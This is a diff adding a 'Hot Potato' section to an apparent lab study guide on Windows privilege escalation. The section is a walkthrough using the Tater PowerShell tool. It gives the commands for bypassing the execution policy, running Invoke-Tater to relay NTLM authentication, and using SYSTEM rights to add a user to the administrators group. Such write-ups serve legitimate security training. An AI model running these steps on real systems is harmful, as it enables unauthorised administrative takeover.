@@ -1227,6 +1227,106 @@ Return to your Metasploit terminal on the Kali VM. The payload will connect back
 
 <details>
   <summary>Potato Escalation - Hot Potato</summary>
+
+
+
+
+
+  
+  
+  
+  
+  
+  Windows Privilege Escalation: Hot Potato (Tater)
+  ================================================
+  
+  This guide demonstrates the "Hot Potato" privilege escalation technique using the PowerShell tool `Tater`. This attack leverages NBNS spoofing and WPAD protocol abuse to relay NTLM authentication from privileged local services (like the Windows Update service) back to the local machine. This allows an attacker with `SeImpersonatePrivilege` to impersonate the service and execute commands as `NT AUTHORITY\SYSTEM`.
+  
+  ⚙️ Prerequisites
+  ----------------
+  
+  For this attack to be successful, the following conditions are typically required:
+  
+  -   You have a shell as a low-privileged user.
+  
+  -   The user account has `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` enabled. These are common for network service accounts.
+  
+  -   The `Tater.ps1` script has been transferred to the target Windows machine.
+  
+  💥 Exploitation
+  ---------------
+  
+  The entire exploitation process can be carried out from a single PowerShell session on the target Windows VM.
+  
+  1.  Start a PowerShell Session
+  
+      First, open a PowerShell prompt with a bypassed execution policy to ensure you can run scripts.
+  
+      
+  
+      ```PowerShell
+      powershell.exe -nop -ep bypass
+  
+      ```
+  
+  2.  Import the Tater Module
+  
+      Load the Tater.ps1 script into your current PowerShell session to make its functions available.
+  
+      
+  
+      ```PowerShell
+      Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1
+  
+      ```
+  
+  3.  Invoke the Tater Exploit
+  
+      Execute the main function to start the attack. The tool will set up the necessary listeners, spoofers, and trigger a privileged service to authenticate to it.
+  
+      
+  
+      ```PowerShell
+      Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
+  
+      ```
+  
+      -   **`-Trigger 1`**: This option tells Tater to trigger the Windows Defender/Update service, which runs as `SYSTEM`.
+  
+      -   **`-Command "..."`**: This is the payload that will be executed with `SYSTEM` privileges once the NTLM relay and impersonation are successful.
+  
+      The tool will provide real-time output, and upon success, the command will be executed.
+  
+  ✅ Verification
+  --------------
+  
+  To confirm that the privilege escalation was successful, check the membership of the local administrators group.
+  
+  1.  Check Administrators Group
+  
+      In the same PowerShell prompt, type:
+  
+      
+  
+      ```PowerShell
+      net localgroup administrators
+  
+      ```
+
+      <img width="1026" height="656" alt="image" src="https://github.com/user-attachments/assets/db4351a6-d3e3-42a2-8478-76290cc208c8" />
+
+  
+      You will now see the `user` account listed as a member of the group, confirming a successful privilege escalation to the highest level on the system.
+  
+  
+
+
+
+
+
+
+
+  
 </details>
 
 
